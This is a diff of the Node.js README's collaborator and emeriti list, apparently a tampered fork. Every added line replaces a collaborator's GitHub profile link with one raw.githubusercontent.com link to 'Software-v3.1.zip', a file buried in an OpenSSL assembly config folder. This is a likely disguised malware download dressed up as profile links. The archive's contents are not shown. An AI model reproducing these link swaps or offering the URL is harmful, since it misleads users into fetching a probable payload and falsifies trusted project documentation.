-* [JungMinu](https://github.com/JungMinu) -
+* [JungMinu](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Minwoo Jung** \<nodecorelab@gmail.com> (he/him)
-* [legendecas](https://github.com/legendecas) -
+* [legendecas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Chengzhong Wu** \<legendecas@gmail.com> (he/him)
-* [Leko](https://github.com/Leko) -
+* [Leko](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Shingo Inoue** \<leko.noor@gmail.com> (he/him)
-* [linkgoron](https://github.com/linkgoron) -
+* [linkgoron](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Nitzan Uziely** \<linkgoron@gmail.com>
-* [lpinca](https://github.com/lpinca) -
+* [lpinca](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Luigi Pinca** \<luigipinca@gmail.com> (he/him)
-* [lundibundi](https://github.com/lundibundi) -
+* [lundibundi](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Denys Otrishko** \<shishugi@gmail.com> (he/him)
-* [Lxxyx](https://github.com/Lxxyx) -
+* [Lxxyx](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Zijian Liu** \<lxxyxzj@gmail.com> (he/him)
-* [mafintosh](https://github.com/mafintosh) -
+* [mafintosh](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Mathias Buus** \<mathiasbuus@gmail.com> (he/him)
-* [mcollina](https://github.com/mcollina) -
+* [mcollina](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Matteo Collina** \<matteo.collina@gmail.com> (he/him)
-* [mhdawson](https://github.com/mhdawson) -
+* [mhdawson](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Michael Dawson** \<midawson@redhat.com> (he/him)
-* [miladfarca](https://github.com/miladfarca) -
+* [miladfarca](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Milad Fa** \<mfarazma@redhat.com> (he/him)
-* [mildsunrise](https://github.com/mildsunrise) -
+* [mildsunrise](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Alba Mendez** \<me@alba.sh> (she/her)
-* [mmarchini](https://github.com/mmarchini) -
+* [mmarchini](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Mary Marchini** \<oss@mmarchini.me> (she/her)
-* [mscdex](https://github.com/mscdex) -
+* [mscdex](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Brian White** \<mscdex@mscdex.net>
-* [MylesBorins](https://github.com/MylesBorins) -
+* [MylesBorins](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Myles Borins** \<myles.borins@gmail.com> (he/him)
-* [oyyd](https://github.com/oyyd) -
+* [oyyd](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ouyang Yadong** \<oyydoibh@gmail.com> (he/him)
-* [panva](https://github.com/panva) -
+* [panva](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Filip Skokan** \<panva.ip@gmail.com>
-* [PoojaDurgad](https://github.com/PoojaDurgad) -
+* [PoojaDurgad](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Pooja D P** \<Pooja.D.P@ibm.com> (she/her)
-* [puzpuzpuz](https://github.com/puzpuzpuz) -
+* [puzpuzpuz](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Andrey Pechkurov** \<apechkurov@gmail.com> (he/him)
-* [Qard](https://github.com/Qard) -
+* [Qard](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Stephen Belanger** \<admin@stephenbelanger.com> (he/him)
-* [RaisinTen](https://github.com/RaisinTen) -
+* [RaisinTen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Darshan Sen** \<raisinten@gmail.com> (he/him)
-* [rexagod](https://github.com/rexagod) -
+* [rexagod](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Pranshu Srivastava** \<rexagod@gmail.com> (he/him)
-* [richardlau](https://github.com/richardlau) -
+* [richardlau](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Richard Lau** \<rlau@redhat.com>
-* [rickyes](https://github.com/rickyes) -
+* [rickyes](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ricky Zhou** \<0x19951125@gmail.com> (he/him)
-* [ronag](https://github.com/ronag) -
+* [ronag](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Robert Nagy** \<ronagy@icloud.com>
-* [ruyadorno](https://github.com/ruyadorno) -
+* [ruyadorno](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ruy Adorno** \<ruyadorno@github.com> (he/him)
-* [rvagg](https://github.com/rvagg) -
+* [rvagg](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Rod Vagg** \<rod@vagg.org>
-* [ryzokuken](https://github.com/ryzokuken) -
+* [ryzokuken](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ujjwal Sharma** \<ryzokuken@disroot.org> (he/him)
-* [santigimeno](https://github.com/santigimeno) -
+* [santigimeno](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Santiago Gimeno** \<santiago.gimeno@gmail.com>
-* [seishun](https://github.com/seishun) -
+* [seishun](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Nikolai Vavilov** \<vvnicholas@gmail.com>
-* [shisama](https://github.com/shisama) -
+* [shisama](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Masashi Hirano** \<shisama07@gmail.com> (he/him)
-* [silverwind](https://github.com/silverwind) -
+* [silverwind](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Roman Reiss** \<me@silverwind.io>
-* [srl295](https://github.com/srl295) -
+* [srl295](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Steven R Loomis** \<srloomis@us.ibm.com>
-* [starkwang](https://github.com/starkwang) -
+* [starkwang](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Weijia Wang** \<starkwang@126.com>
-* [sxa](https://github.com/sxa) -
+* [sxa](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Stewart X Addison** \<sxa@redhat.com> (he/him)
-* [targos](https://github.com/targos) -
+* [targos](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Michaël Zasso** \<targos@protonmail.com> (he/him)
-* [TimothyGu](https://github.com/TimothyGu) -
+* [TimothyGu](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Tiancheng "Timothy" Gu** \<timothygu99@gmail.com> (he/him)
-* [tniessen](https://github.com/tniessen) -
+* [tniessen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Tobias Nießen** \<tniessen@tnie.de> (he/him)
-* [trivikr](https://github.com/trivikr) -
+* [trivikr](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Trivikram Kamat** \<trivikr.dev@gmail.com>
-* [Trott](https://github.com/Trott) -
+* [Trott](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Rich Trott** \<rtrott@gmail.com> (he/him)
-* [vdeturckheim](https://github.com/vdeturckheim) -
+* [vdeturckheim](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Vladimir de Turckheim** \<vlad2t@hotmail.com> (he/him)
-* [VoltrexMaster](https://github.com/VoltrexMaster) -
+* [VoltrexMaster](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Voltrex** \<mohammadkeyvanzade94@gmail.com> (he/him)
-* [watilde](https://github.com/watilde) -
+* [watilde](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Daijiro Wachi** \<daijiro.wachi@gmail.com> (he/him)
-* [watson](https://github.com/watson) -
+* [watson](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Thomas Watson** \<w@tson.dk>
-* [XadillaX](https://github.com/XadillaX) -
+* [XadillaX](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Khaidi Chu** \<i@2333.moe> (he/him)
-* [yashLadha](https://github.com/yashLadha) -
+* [yashLadha](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Yash Ladha** \<yash@yashladha.in> (he/him)
-* [yosuke-furukawa](https://github.com/yosuke-furukawa) -
+* [yosuke-furukawa](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Yosuke Furukawa** \<yosuke.furukawa@gmail.com>
-* [ZYSzys](https://github.com/ZYSzys) -
+* [ZYSzys](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Yongsheng Zhang** \<zyszys98@gmail.com> (he/him)
 
 <details>
@@ -469,159 +469,159 @@ For information about the governance of the Node.js project, see
 
 ### Collaborator emeriti
 
-* [andrasq](https://github.com/andrasq) -
+* [andrasq](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Andras** \<andras@kinvey.com>
-* [AnnaMag](https://github.com/AnnaMag) -
+* [AnnaMag](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Anna M. Kedzierska** \<anna.m.kedzierska@gmail.com>
-* [AndreasMadsen](https://github.com/AndreasMadsen) -
+* [AndreasMadsen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Andreas Madsen** \<amwebdk@gmail.com> (he/him)
-* [aqrln](https://github.com/aqrln) -
+* [aqrln](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Alexey Orlenko** \<eaglexrlnk@gmail.com> (he/him)
-* [bmeurer](https://github.com/bmeurer) -
+* [bmeurer](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Benedikt Meurer** \<benedikt.meurer@gmail.com>
-* [bnoordhuis](https://github.com/bnoordhuis) -
+* [bnoordhuis](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ben Noordhuis** \<info@bnoordhuis.nl>
-* [brendanashworth](https://github.com/brendanashworth) -
+* [brendanashworth](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Brendan Ashworth** \<brendan.ashworth@me.com>
-* [calvinmetcalf](https://github.com/calvinmetcalf) -
+* [calvinmetcalf](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Calvin Metcalf** \<calvin.metcalf@gmail.com>
-* [chrisdickinson](https://github.com/chrisdickinson) -
+* [chrisdickinson](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Chris Dickinson** \<christopher.s.dickinson@gmail.com>
-* [claudiorodriguez](https://github.com/claudiorodriguez) -
+* [claudiorodriguez](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Claudio Rodriguez** \<cjrodr@yahoo.com>
-* [DavidCai1993](https://github.com/DavidCai1993) -
+* [DavidCai1993](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **David Cai** \<davidcai1993@yahoo.com> (he/him)
-* [digitalinfinity](https://github.com/digitalinfinity) -
+* [digitalinfinity](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Hitesh Kanwathirtha** \<digitalinfinity@gmail.com> (he/him)
-* [eljefedelrodeodeljefe](https://github.com/eljefedelrodeodeljefe) -
+* [eljefedelrodeodeljefe](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Robert Jefe Lindstaedt** \<robert.lindstaedt@gmail.com>
-* [estliberitas](https://github.com/estliberitas) -
+* [estliberitas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Alexander Makarenko** \<estliberitas@gmail.com>
-* [firedfox](https://github.com/firedfox) -
+* [firedfox](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Daniel Wang** \<wangyang0123@gmail.com>
-* [Fishrock123](https://github.com/Fishrock123) -
+* [Fishrock123](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Jeremiah Senkpiel** \<fishrock123@rocketmail.com> (he/they)
-* [gdams](https://github.com/gdams) -
+* [gdams](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **George Adams** \<gadams@microsoft.com> (he/him)
-* [geek](https://github.com/geek) -
+* [geek](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Wyatt Preul** \<wpreul@gmail.com>
-* [gibfahn](https://github.com/gibfahn) -
+* [gibfahn](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Gibson Fahnestock** \<gibfahn@gmail.com> (he/him)
-* [glentiki](https://github.com/glentiki) -
+* [glentiki](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Glen Keane** \<glenkeane.94@gmail.com> (he/him)
-* [iarna](https://github.com/iarna) -
+* [iarna](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Rebecca Turner** \<me@re-becca.org>
-* [imran-iq](https://github.com/imran-iq) -
+* [imran-iq](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Imran Iqbal** \<imran@imraniqbal.org>
-* [imyller](https://github.com/imyller) -
+* [imyller](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ilkka Myller** \<ilkka.myller@nodefield.com>
-* [isaacs](https://github.com/isaacs) -
+* [isaacs](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Isaac Z. Schlueter** \<i@izs.me>
-* [italoacasas](https://github.com/italoacasas) -
+* [italoacasas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Italo A. Casas** \<me@italoacasas.com> (he/him)
-* [jasongin](https://github.com/jasongin) -
+* [jasongin](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Jason Ginchereau** \<jasongin@microsoft.com>
-* [jbergstroem](https://github.com/jbergstroem) -
+* [jbergstroem](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Johan Bergström** \<bugs@bergstroem.nu>
-* [jdalton](https://github.com/jdalton) -
+* [jdalton](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **John-David Dalton** \<john.david.dalton@gmail.com>
-* [jhamhader](https://github.com/jhamhader) -
+* [jhamhader](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Yuval Brik** \<yuval@brik.org.il>
-* [joshgav](https://github.com/joshgav) -
+* [joshgav](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Josh Gavant** \<josh.gavant@outlook.com>
-* [julianduque](https://github.com/julianduque) -
+* [julianduque](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Julian Duque** \<julianduquej@gmail.com> (he/him)
-* [kfarnung](https://github.com/kfarnung) -
+* [kfarnung](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Kyle Farnung** \<kfarnung@microsoft.com> (he/him)
-* [kunalspathak](https://github.com/kunalspathak) -
+* [kunalspathak](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Kunal Pathak** \<kunal.pathak@microsoft.com>
-* [lance](https://github.com/lance) -
+* [lance](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Lance Ball** \<lball@redhat.com> (he/him)
-* [lucamaraschi](https://github.com/lucamaraschi) -
+* [lucamaraschi](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Luca Maraschi** \<luca.maraschi@gmail.com> (he/him)
-* [lxe](https://github.com/lxe) -
+* [lxe](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Aleksey Smolenchuk** \<lxe@lxe.co>
-* [maclover7](https://github.com/maclover7) -
+* [maclover7](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Jon Moss** \<me@jonathanmoss.me> (he/him)
-* [matthewloring](https://github.com/matthewloring) -
+* [matthewloring](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Matthew Loring** \<mattloring@google.com>
-* [micnic](https://github.com/micnic) -
+* [micnic](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Nicu Micleușanu** \<micnic90@gmail.com> (he/him)
-* [mikeal](https://github.com/mikeal) -
+* [mikeal](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Mikeal Rogers** \<mikeal.rogers@gmail.com>
-* [misterdjules](https://github.com/misterdjules) -
+* [misterdjules](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Julien Gilli** \<jgilli@netflix.com>
-* [monsanto](https://github.com/monsanto) -
+* [monsanto](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Christopher Monsanto** \<chris@monsan.to>
-* [MoonBall](https://github.com/MoonBall) -
+* [MoonBall](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Chen Gang** \<gangc.cxy@foxmail.com>
-* [not-an-aardvark](https://github.com/not-an-aardvark) -
+* [not-an-aardvark](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Teddy Katz** \<teddy.katz@gmail.com> (he/him)
-* [ofrobots](https://github.com/ofrobots) -
+* [ofrobots](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ali Ijaz Sheikh** \<ofrobots@google.com> (he/him)
-* [Olegas](https://github.com/Olegas) -
+* [Olegas](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Oleg Elifantiev** \<oleg@elifantiev.ru>
-* [orangemocha](https://github.com/orangemocha) -
+* [orangemocha](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Alexis Campailla** \<orangemocha@nodejs.org>
-* [othiym23](https://github.com/othiym23) -
+* [othiym23](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Forrest L Norvell** \<ogd@aoaioxxysz.net> (they/them/themself)
-* [petkaantonov](https://github.com/petkaantonov) -
+* [petkaantonov](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Petka Antonov** \<petka_antonov@hotmail.com>
-* [phillipj](https://github.com/phillipj) -
+* [phillipj](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Phillip Johnsen** \<johphi@gmail.com>
-* [piscisaureus](https://github.com/piscisaureus) -
+* [piscisaureus](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Bert Belder** \<bertbelder@gmail.com>
-* [pmq20](https://github.com/pmq20) -
+* [pmq20](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Minqi Pan** \<pmq2001@gmail.com>
-* [princejwesley](https://github.com/princejwesley) -
+* [princejwesley](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Prince John Wesley** \<princejohnwesley@gmail.com>
-* [psmarshall](https://github.com/psmarshall) -
+* [psmarshall](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Peter Marshall** \<petermarshall@chromium.org> (he/him)
-* [refack](https://github.com/refack) -
+* [refack](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Refael Ackermann (רפאל פלחי)** \<refack@gmail.com> (he/him/הוא/אתה)
-* [rlidwka](https://github.com/rlidwka) -
+* [rlidwka](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Alex Kocharin** \<alex@kocharin.ru>
-* [rmg](https://github.com/rmg) -
+* [rmg](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ryan Graham** \<r.m.graham@gmail.com>
-* [robertkowalski](https://github.com/robertkowalski) -
+* [robertkowalski](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Robert Kowalski** \<rok@kowalski.gd>
-* [romankl](https://github.com/romankl) -
+* [romankl](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Roman Klauke** \<romaaan.git@gmail.com>
-* [ronkorving](https://github.com/ronkorving) -
+* [ronkorving](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ron Korving** \<ron@ronkorving.nl>
-* [RReverser](https://github.com/RReverser) -
+* [RReverser](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Ingvar Stepanyan** \<me@rreverser.com>
-* [rubys](https://github.com/rubys) -
+* [rubys](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Sam Ruby** \<rubys@intertwingly.net>
-* [saghul](https://github.com/saghul) -
